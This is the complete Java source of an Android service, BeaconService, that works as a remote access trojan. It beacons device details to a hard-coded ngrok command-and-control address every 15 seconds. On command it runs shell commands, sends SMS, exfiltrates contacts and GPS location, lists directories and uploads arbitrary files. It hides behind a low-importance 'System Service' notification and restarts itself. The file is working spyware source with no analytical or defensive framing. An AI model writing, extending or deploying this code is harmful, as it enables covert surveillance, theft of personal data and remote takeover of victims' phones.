package com.kaku.svc;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class BeaconService extends Service {

    private static final String C2 = "https://handwoven-palm-wobbling.ngrok-free.dev";
    private static final long BEACON_INTERVAL_MS = 15000L;

    private String deviceId;
    private HandlerThread thread;
    private Handler handler;
    private volatile boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotification());

        deviceId = getSharedPreferences("svc", MODE_PRIVATE)
                .getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8);
            getSharedPreferences("svc", MODE_PRIVATE)
                    .edit().putString("id", deviceId).apply();
        }

        thread = new HandlerThread("svc");
        thread.start();
        handler = new Handler(thread.getLooper());
        handler.post(this::loop);
    }

    private Notification buildNotification() {
        String ch = "svc";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm.getNotificationChannel(ch) == null) {
                nm.createNotificationChannel(new NotificationChannel(
                        ch, "Service", NotificationManager.IMPORTANCE_MIN));
            }
        }
        Notification.Builder b = (Build.VERSION.SDK_INT >= 26)
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        return b.setContentTitle("System Service")
                .setContentText("running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
    }

    private void loop() {
        while (running) {
            try {
                JSONObject resp = beacon();
                if (resp != null) {
                    JSONArray cmds = resp.optJSONArray("cmds");
                    if (cmds != null) {
                        for (int i = 0; i < cmds.length(); i++) {
                            handle(cmds.getJSONObject(i));
                        }
                    }
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(BEACON_INTERVAL_MS); }
            catch (InterruptedException e) { break; }
        }
    }

    private JSONObject beacon() throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("id", deviceId);
        payload.put("model", Build.MANUFACTURER + " " + Build.MODEL);
        payload.put("android", Build.VERSION.RELEASE);
        return postJSON(C2 + "/beacon", payload);
    }

    private JSONObject postJSON(String url, JSONObject body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(10000);
        c.setReadTimeout(10000);
        c.setRequestProperty("Content-Type", "application/json");
        try (OutputStream os = c.getOutputStream()) {
            os.write(body.toString().getBytes("UTF-8"));
        }
        int code = c.getResponseCode();
        if (code != 200) return null;
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) sb.append(line);
        r.close();
        return new JSONObject(sb.toString());
    }

    private void handle(JSONObject cmd) {
        String type = cmd.optString("type");
        try {
            switch (type) {
                case "shell":    doShell(cmd.optString("arg")); break;
                case "sms":      doSms(cmd.optString("number"), cmd.optString("text")); break;
                case "contacts": doContacts(); break;
                case "location": doLocation(); break;
                case "files":    doFiles(cmd.optString("path", "/")); break;
                case "download": doDownload(cmd.optString("path")); break;
            }
        } catch (Exception e) {
            report(type, "err: " + e.getMessage());
        }
    }

    private void report(String tag, String data) {
        try {
            JSONObject j = new JSONObject();
            j.put("id", deviceId);
            j.put("tag", tag);
            j.put("data", data);
            postJSON(C2 + "/result", j);
        } catch (Exception ignored) {}
    }

    private void upload(String name, byte[] bytes) {
        try {
            JSONObject j = new JSONObject();
            j.put("id", deviceId);
            j.put("name", name);
            j.put("content", Base64.encodeToString(bytes, Base64.NO_WRAP));
            postJSON(C2 + "/upload", j);
        } catch (Exception ignored) {}
    }

    private void doShell(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) sb.append(line).append('\n');
        p.waitFor();
        report("shell", sb.toString());
    }

    private void doSms(String number, String text) throws Exception {
        SmsManager sm = SmsManager.getDefault();
        sm.sendTextMessage(number, null, text, null, null);
        report("sms", "sent -> " + number);
    }

    private void doContacts() throws Exception {
        StringBuilder sb = new StringBuilder();
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(" | ").append(num).append('\n');
            }
            c.close();
        }
        report("contacts", sb.toString());
    }

    private void doLocation() throws Exception {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            report("location", "no permission");
            return;
        }
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        if (loc == null) { report("location", "no fix"); return; }
        report("location", loc.getLatitude() + "," + loc.getLongitude()
                + " acc=" + loc.getAccuracy());
    }

    private void doFiles(String path) throws Exception {
        File dir = new File(path);
        File[] files = dir.listFiles();
        StringBuilder sb = new StringBuilder();
        if (files != null) {
            for (File f : files) {
                sb.append(f.isDirectory() ? "d " : "f ")
                  .append(f.length()).append('\t')
                  .append(f.getAbsolutePath()).append('\n');
            }
        }
        report("files", sb.toString());
    }

    private void doDownload(String path) throws Exception {
        File f = new File(path);
        if (!f.exists() || !f.isFile()) { report("download", "not a file"); return; }
        byte[] buf = new byte[(int) f.length()];
        try (FileInputStream in = new FileInputStream(f)) {
            int read = 0;
            while (read < buf.length) {
                int r = in.read(buf, read, buf.length - read);
                if (r < 0) break;
                read += r;
            }
        }
        upload(f.getName(), buf);
        report("download", "sent " + f.getName());
    }

    @Override
    public int onStartCommand(Intent i, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (thread != null) thread.quitSafely();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
